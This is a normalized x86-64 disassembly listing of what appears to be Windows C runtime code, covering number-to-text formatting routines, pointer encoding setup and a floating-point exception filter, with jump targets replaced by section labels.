cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] eax
mov [ rdi ] ax
jmp r-xdata
mov edx [ rsp + 0x48 ]
or r13d r11d
jmp r-xdata
mov r15d 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
test r13b 0x40
je r-xdata
and r13d 0xfffffff7
cmp r15d r11d
cmovg r15d r11d
mov r15d 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x58 ] r10d
mov rax [ rbp - 0x60 ]
test rax rax
je r-xdata
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_180023ce0
xor r10d r10d
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x4c ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x4d ] al
jmp r-xdata
mov rbx [ r14 ]
cmp r15d esi
mov eax r15d
mov ecx 0x7fffffff
cmove eax ecx
add r14 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov r14d [ rsp + 0x60 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_18002f590
xor r10d r10d
mov rsi [ rsp + 0x68 ]
or r8d 0xffffffff
mov [ rsp + 0x40 ] r8d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
je r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x50 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r14d
mov r14 [ rsp + 0x70 ]
lea rax [ rbp + 0x1bf ]
sub eax ebx
inc rbx
mov [ rsp + 0x44 ] eax
test r11d r13d
je r-xdata
mov rax [ r14 ]
add r14 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test r8d r8d
js r-xdata
mov r8 [ rsp + 0x68 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
call sub_18002f5e4
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx r15d
dec r15d
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_18002f534
xor r10d r10d
test eax eax
jne r-xdata
mov rsi [ rsp + 0x68 ]
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x60 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x44 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov r8d [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x44 ] ecx
jmp r-xdata
mov [ rsp + 0x50 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x50 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x44 ] eax
sub_180027868
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x50
xor ebx ebx
mov r12 r8
mov r13 rcx
mov rsi rdx
lea rcx [ rbp - 0x28 ]
lea r8d [ rbx + 0x28 ]
xor edx edx
mov rdi r9
mov [ rbp - 0x30 ] rbx
call sub_180021150
test rdi rdi
jne r-xdata
test r12 r12
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
or eax 0xffffffff
jmp r-xdata
mov r9 [ rbp + 0x48 ]
mov r8 [ rbp + 0x40 ]
mov ecx 0x7fffffff
cmp r12 rcx
mov eax r12d
mov rdx rdi
cmova eax ecx
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x18 ] 0x42
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] rsi
mov [ rbp - 0x28 ] eax
call r13
mov edi eax
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rbp
retn
test eax eax
js r-xdata
cmp [ rbp - 0x28 ] ebx
mov [ rsi + r12 - 0x1 ] bl
setge bl
lea eax [ rbx - 0x2 ]
dec [ rbp - 0x28 ]
js r-xdata
lea rdx [ rbp - 0x30 ]
xor ecx ecx
call sub_180026c74
cmp eax 0xffffffff
je r-xdata
mov rax [ rbp - 0x30 ]
mov [ rax ] bl
jmp r-xdata
mov eax edi
jmp r-xdata
sub_180027950
push rbx
sub rsp 0x30
mov rbx rcx
test r8 r8
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
test rcx rcx
je r-xdata
test rdx rdx
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
mov r9 r8
mov r8 rdx
mov rdx rcx
lea rcx [ sub_18002f68c ]
call sub_180027868
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
call sub_180022de4
mov [ rax ] 0x22
jmp r-xdata
call sub_180026534
or eax 0xffffffff
sub_1800279c0
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_1800221bc
movsx ecx [ rbx ]
call sub_1800302b0
cmp eax 0x65
je r-xdata
movsx ecx [ rbx ]
call sub_1800302b0
cmp eax 0x78
jne r-xdata
inc rbx
movzx ecx [ rbx ]
call sub_180022700
test eax eax
jne r-xdata
mov rax [ rsp + 0x20 ]
mov dl [ rbx ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rbx ] cl
inc rbx
add rbx 0x2
mov al [ rbx ]
mov [ rbx ] dl
mov dl al
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
cmp [ rsp + 0x38 ] al
je r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180027a40
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_1800221bc
mov r11b [ rbx ]
mov rcx [ rsp + 0x20 ]
test r11b r11b
je r-xdata
mov al [ rbx ]
inc rbx
test al al
je r-xdata
mov rax [ rcx + 0x128 ]
mov rdx [ rax ]
mov al [ rdx ]
cmp [ rsp + 0x38 ] 0x0
je r-xdata
jmp r-xdata
inc rbx
mov r11b [ rbx ]
test r11b r11b
jne r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov al [ rbx ]
test al al
jne r-xdata
cmp r11b al
je r-xdata
cmp al 0x65
je r-xdata
mov rdx rbx
cmp al 0x45
je r-xdata
dec rbx
cmp [ rbx ] 0x30
je r-xdata
mov rax [ rcx + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
cmp [ rbx ] al
jne r-xdata
inc rbx
mov al [ rdx ]
inc rbx
inc rdx
mov [ rbx ] al
test al al
jne r-xdata
dec rbx
sub_180027af8
push rbx
sub rsp 0x30
mov rax r8
mov rbx rdx
mov r8 r9
mov rdx rax
test ecx ecx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_1800303d0
mov r11d [ rsp + 0x40 ]
mov [ rbx ] r11d
lea rcx [ rsp + 0x20 ]
call sub_1800302d0
mov r11 [ rsp + 0x20 ]
mov [ rbx ] r11
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_180027b54
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x50
mov r12 rdx
mov rdx [ rsp + 0xa0 ]
mov rdi rcx
lea rcx [ rax - 0x38 ]
mov r15d r9d
movsxd rbx r8d
call sub_1800221bc
test rdi rdi
jne r-xdata
test r12 r12
jne r-xdata
call sub_180022de4
lea ebx [ rdi + 0x16 ]
xor eax eax
test ebx ebx
cmovg eax ebx
add eax 0x9
cdqe
cmp r12 rax
ja r-xdata
call sub_180022de4
lea ebx [ r12 + 0x16 ]
mov [ rax ] ebx
call sub_180026534
cmp [ rsp + 0x48 ] r12b
je r-xdata
mov eax ebx
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x98 ] 0x0
mov rsi [ rsp + 0x90 ]
je r-xdata
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsi ] 0x2d
mov rdx rdi
jne r-xdata
xor ebp ebp
cmp [ rsi ] 0x2d
sete bpl
xor r13d r13d
add rbp rdi
test ebx ebx
setg r13b
test r13d r13d
je r-xdata
mov [ rax ] ebx
call sub_180026534
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ rdi ] 0x2d
lea rdx [ rdi + 0x1 ]
mov rcx rbp
call sub_180023ce0
movsxd rcx r13d
mov rdx rbp
lea r8 [ rax + 0x1 ]
add rcx rbp
call sub_1800205e0
xor ecx ecx
lea r8 [ r--data ]
cmp [ rsp + 0x98 ] cl
sete cl
add rbx rdx
add rbx rcx
sub rdi rbx
cmp r12 0xffffffffffffffff
mov rcx rbx
lea rdx [ r12 + rdi ]
cmove rdx r12
call sub_180025324
test eax eax
jne r-xdata
mov al [ rdx + 0x1 ]
mov [ rdx ] al
mov rax [ rsp + 0x30 ]
inc rdx
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rdx ] cl
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
lea rcx [ rbx + 0x2 ]
test r15d r15d
je r-xdata
mov rax [ rsi + 0x10 ]
cmp [ rax ] 0x30
je r-xdata
mov [ rbx ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov r8d [ rsi + 0x4 ]
dec r8d
jns r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp [ rcx ] 0x30
jne r-xdata
cmp r8d 0x64
jl r-xdata
neg r8d
mov [ rbx + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
lea rdx [ rcx + 0x1 ]
mov r8d 0x3
call sub_1800205e0
cmp r8d 0xa
jl r-xdata
mov eax 0x51eb851f
imul r8d
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x2 ] dl
imul edx edx 0xffffff9c
add r8d edx
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r13
pop r12
retn
add [ rbx + 0x4 ] r8b
mov eax 0x66666667
imul r8d
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x3 ] dl
imul edx edx 0xfffffff6
add r8d edx
sub_180027d88
push rbx
push rbp
push rsi
push rdi
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebp
call sub_180030664
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180022de4
mov [ rax ] ebp
call sub_180026534
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x88
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
lea r8d [ rsi + 0x1 ]
sete al
xor ecx ecx
test esi esi
setg cl
add rax rdi
lea r9 [ rsp + 0x40 ]
add rcx rax
call sub_1800304d0
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
xor eax eax
test esi esi
setg al
sub rdx rax
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d esi
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_180027b54
mov [ rdi ] 0x0
jmp r-xdata
sub_180027e80
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x50
mov rdi rdx
mov rdx [ rbp + 0x58 ]
mov r14 rcx
lea rcx [ rbp - 0x20 ]
mov r12d r9d
mov rbx r8
mov [ rbp + 0x30 ] 0x3ff
mov r13d 0x30
call sub_1800221bc
xor r15d r15d
test r12d r12d
cmovs r12d r15d
test rdi rdi
jne r-xdata
test rbx rbx
jne r-xdata
call sub_180022de4
lea ebx [ rdi + 0x16 ]
lea eax [ r12 + 0xb ]
mov [ rdi ] r15b
movsxd rcx eax
cmp rbx rcx
ja r-xdata
call sub_180022de4
mov ebx 0x16
mov [ rax ] ebx
call sub_180026534
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rax [ r14 ]
mov ecx 0x7ff
shr rax 0x34
and rax rcx
cmp rax rcx
jne r-xdata
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax 0x8000000000000000
test [ r14 ] rax
je r-xdata
lea r8 [ rbx - 0x2 ]
cmp rbx 0xffffffffffffffff
lea rdx [ rdi + 0x2 ]
mov r9d r12d
mov rcx r14
cmove r8 rbx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] r15d
call sub_180027d88
test eax eax
je r-xdata
mov [ rax ] ebx
call sub_180026534
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov r9d [ rbp + 0x50 ]
mov r11d 0x30
mov rbx 0xfffffffffffff
mov eax r9d
mov [ rdi ] r11b
neg eax
mov eax r9d
sbb cl cl
and cl 0xe0
add cl 0x78
neg eax
mov rax 0x7ff0000000000000
sbb edx edx
mov [ rdi + 0x1 ] cl
and edx 0xffffffe0
sub edx 0xffffffd9
test [ r14 ] rax
jne r-xdata
mov [ rdi ] 0x2d
inc rdi
cmp [ rdi + 0x2 ] 0x2d
jne r-xdata
mov [ rdi ] r15b
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov [ rdi + 0x2 ] 0x31
add rdi 0x3
mov [ rdi + 0x2 ] r11b
mov rax [ r14 ]
add rdi 0x3
and rax rbx
neg rax
sbb rax rax
and eax 0x3fe
mov [ rbp + 0x30 ] rax
jmp r-xdata
mov ebx [ rbp + 0x50 ]
mov [ rdi ] 0x30
mov edx 0x65
mov eax ebx
neg eax
sbb cl cl
and cl 0xe0
add cl 0x78
mov [ rdi + 0x1 ] cl
lea rcx [ rdi + 0x2 ]
call sub_180030138
test rax rax
je r-xdata
mov [ rdi ] 0x2d
inc rdi
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ r15 ] cl
mov [ r15 ] r10b
jmp r-xdata
mov r15 rdi
xor r10d r10d
inc rdi
test r12d r12d
jne r-xdata
cmp [ rbp - 0x8 ] r15b
jmp r-xdata
neg ebx
sbb cl cl
and cl 0xe0
add cl 0x70
mov [ rax ] cl
mov [ rax + 0x3 ] r15b
test r12d r12d
jle r-xdata
mov r8 0xf000000000000
test [ r14 ] rbx
jbe r-xdata
je r-xdata
cmp [ r15 ] r10b
cmove rdi r15
neg r9d
sbb al al
and al 0xe0
add al 0x70
mov [ rdi ] al
mov rcx [ r14 ]
shr rcx 0x34
and ecx 0x7ff
sub rcx [ rbp + 0x30 ]
js r-xdata
mov r8d r12d
mov dl r11b
mov rcx rdi
mov ebx r12d
call sub_180021150
mov r9d [ rbp + 0x50 ]
add rdi rbx
xor r10d r10d
lea r11d [ r10 + 0x30 ]
test r13w r13w
js r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
add ax r11w
cmp ax 0x39
jbe r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov [ rdi + 0x1 ] 0x2d
add rdi 0x2
neg rcx
mov [ rdi + 0x1 ] 0x2b
add rdi 0x2
jmp r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
cmp ax 0x8
jbe r-xdata
mov [ rdi ] al
shr r8 0x4
dec r12d
inc rdi
add r13w 0xfffc
jns r-xdata
add ax dx
cmp rcx 0x64
jl r-xdata
mov rax 0x20c49ba5e353f7cf
imul rcx
sar rdx 0x7
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffc18
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rdi r8
jne r-xdata
mov r8 rdi
mov [ rdi ] r11b
cmp rcx 0x3e8
jl r-xdata
lea rax [ rdi - 0x1 ]
test r12d r12d
jle r-xdata
cmp rdi r8
jne r-xdata
mov rax 0xa3d70a3d70a3d70b
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xffffffffffffff9c
mov [ rdi ] al
inc rdi
add rcx rdx
mov [ rax ] r11b
dec rax
jmp r-xdata
cmp [ rax ] 0x46
jne r-xdata
mov rax 0x6666666666666667
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffff6
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rcx 0xa
jl r-xdata
cmp [ rax ] 0x66
je r-xdata
cmp rax r15
je r-xdata
add cl r11b
cmp [ rbp - 0x8 ] r10b
mov [ rdi ] cl
mov [ rdi + 0x1 ] r10b
inc [ rax - 0x1 ]
mov cl [ rax ]
cmp cl 0x39
jne r-xdata
inc cl
mov [ rax ] cl
jmp r-xdata
add dl 0x3a
mov [ rax ] dl
jmp r-xdata
sub_180028260
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
mov ebx [ r9 + 0x4 ]
mov rsi rdx
mov rdx [ rsp + 0x78 ]
mov rdi rcx
lea rcx [ rax - 0x28 ]
mov r12 r9
dec ebx
mov ebp r8d
call sub_1800221bc
test rdi rdi
jne r-xdata
test rsi rsi
jne r-xdata
call sub_180022de4
lea ebx [ rdi + 0x16 ]
mov [ rax ] ebx
call sub_180026534
cmp [ rsp + 0x38 ] dil
je r-xdata
cmp [ rsp + 0x70 ] 0x0
je r-xdata
call sub_180022de4
lea ebx [ rsi + 0x16 ]
mov [ rax ] ebx
call sub_180026534
cmp [ rsp + 0x38 ] sil
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ r12 ] 0x2d
jne r-xdata
cmp ebx ebp
jne r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
cmp [ r12 + 0x4 ] 0x0
jg r-xdata
mov [ rdi ] 0x2d
inc rdi
xor eax eax
cmp [ r12 ] 0x2d
movsxd rcx ebx
sete al
add rax rdi
mov [ rcx + rax ] 0x30
movsxd rax [ r12 + 0x4 ]
add rdi rax
mov rcx rdi
call sub_180023ce0
lea rcx [ rdi + 0x1 ]
mov rdx rdi
lea r8 [ rax + 0x1 ]
call sub_1800205e0
mov [ rdi ] 0x30
inc rdi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rcx rdi
lea rsi [ rdi + 0x1 ]
call sub_180023ce0
mov rdx rdi
mov rcx rsi
lea r8 [ rax + 0x1 ]
call sub_1800205e0
mov r11 [ rsp + 0x20 ]
mov rax [ r11 + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
mov [ rdi ] al
mov ebx [ r12 + 0x4 ]
test ebx ebx
jns r-xdata
test ebp ebp
jle r-xdata
xor eax eax
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
neg ebx
cmp [ rsp + 0x70 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov ebx ebp
cmp ebp eax
cmovge ebx eax
movsxd r8 ebx
mov edx 0x30
mov rcx rsi
call sub_180021150
mov rcx rsi
call sub_180023ce0
movsxd rcx ebx
mov rdx rsi
lea r8 [ rax + 0x1 ]
add rcx rsi
call sub_1800205e0
sub_1800283fc
push rbx
push rbp
push rsi
push rdi
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x48 ]
lea rdx [ rsp + 0x30 ]
mov r9d ebp
call sub_180030664
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_180022de4
mov [ rax ] ebp
call sub_180026534
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x78
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov r8d [ rsp + 0x34 ]
xor ecx ecx
lea r9 [ rsp + 0x30 ]
add r8d esi
cmp [ rsp + 0x30 ] 0x2d
sete cl
add rcx rdi
call sub_1800304d0
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x30 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
mov rax [ rsp + 0xc0 ]
lea r9 [ rsp + 0x30 ]
mov r8d esi
mov [ rsp + 0x28 ] rax
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_180028260
mov [ rdi ] 0x0
jmp r-xdata
sub_1800284d0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rdi r8
mov rsi rdx
mov ebp r9d
mov ebx 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebx
call sub_180030664
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180022de4
mov [ rax ] ebx
call sub_180026534
mov eax ebx
jmp r-xdata
mov r12d [ rsp + 0x44 ]
xor eax eax
dec r12d
cmp [ rsp + 0x40 ] 0x2d
sete al
or rdx 0xffffffffffffffff
lea rbx [ rax + rsi ]
cmp rdi rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x80
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov rcx rbx
call sub_1800304d0
test eax eax
je r-xdata
mov rdx rdi
sub rdx rax
mov eax [ rsp + 0x44 ]
dec eax
cmp r12d eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ rsi ] 0x0
jmp r-xdata
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d ebp
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rax
call sub_180027b54
cmp eax ebp
jge r-xdata
test cl cl
je r-xdata
mov rax [ rsp + 0xd8 ]
lea r9 [ rsp + 0x40 ]
mov r8d ebp
mov [ rsp + 0x28 ] rax
mov rdx rdi
mov rcx rsi
mov [ rsp + 0x20 ] 0x1
call sub_180028260
jmp r-xdata
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
mov [ rbx - 0x2 ] al
sub_180028604
sub rsp 0x38
cmp r9d 0x65
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180027d88
cmp r9d 0x45
je r-xdata
cmp r9d 0x66
jne r-xdata
cmp r9d 0x61
je r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_1800283fc
jmp r-xdata
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_180027e80
jmp r-xdata
cmp r9d 0x41
je r-xdata
add rsp 0x38
retn
mov rax [ rsp + 0x70 ]
mov r9d [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] eax
call sub_1800284d0
jmp r-xdata
sub_1800286c0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov edi 0xa
mov rcx [ rbx ]
call [ EncodePointer@IAT ]
mov [ rbx ] rax
add rbx 0x8
dec rdi
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800286f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_180025c0c
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
